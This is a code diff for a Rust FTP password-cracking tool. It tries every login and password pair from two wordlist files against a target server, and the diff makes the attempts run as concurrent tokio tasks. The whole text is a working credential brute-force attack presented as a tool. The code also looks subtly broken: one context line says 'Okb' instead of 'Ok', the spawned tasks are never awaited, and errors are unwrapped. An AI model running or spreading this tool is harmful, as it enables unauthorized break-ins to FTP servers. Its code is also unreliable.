@@ -10,10 +10,11 @@ use suppaftp::FtpStream;
 
 mod error;
 
-fn main() -> Result<(), Error> {
+#[tokio::main]
+async fn main() -> Result<(), Error> {
     let args: Vec<String> = env::args().collect();
     check_arguments(&args)?;
-    cracker(&args[1], &args[2], &args[3])?;
+    cracker(&args[1], &args[2], &args[3]).await;
     Ok(())
 }
 
@@ -24,19 +25,33 @@ fn check_arguments(args: &Vec<String>) -> Result<(), Error> {
     Err(error::CrackerError::WrongArguments.into())
 }
 
-fn cracker(logins: &str, passwords: &str, target: &str) -> Result<(), Error> {
-    let (logins, passwords) = parse_files(logins, passwords)?;
+async fn cracker(logins: &str, passwords: &str, target: &str) {
+    let (logins, passwords) = parse_files(logins, passwords).unwrap();
     for login in &logins {
-        for password in &passwords {
-            caller(login, password, target)?;
-        }
+        let login = login.clone();
+        let target = target.to_string();
+        let passwords = passwords.clone();
+
+        tokio::spawn(async move {
+            let login_clone = login.clone();
+            let password_clone = passwords.clone();
+            let target_clone = target.to_string();
+
+            for password in &password_clone {
+                let login_clone = login_clone.clone();
+                let password_clone = password.clone();
+                let target_clone = target_clone.to_string();
+                tokio::spawn(async move {
+                    caller(&login_clone, &password_clone, &target_clone).await;
+                });
+            }
+        });
     }
-    Err(error::CrackerError::CredentialsNotFound.into())
 }
 
-fn caller(login: &str, password: &str, target: &str) -> Result<(), Error> {
-    println!("trying: {}:{} - {}", login, password, target);
-    let mut ftp_stream = FtpStream::connect(target)?;
+async fn caller(login: &str, password: &str, target: &str) {
+    println!("       {}:{} - {}", login, password, target);
+    let mut ftp_stream = FtpStream::connect(target).unwrap();
     match ftp_stream.login(login, password) {
         Err(_) => {}
         Okb(_) => {
@@ -45,7 +60,6 @@ fn caller(login: &str, password: &str, target: &str) -> Result<(), Error> {
             process::exit(0x0100);
         }
     };
-    Ok(())
 }
 
 fn parse_files(logins: &str, passwords: &str) -> Result<(Vec<String>, Vec<String>), Error> {
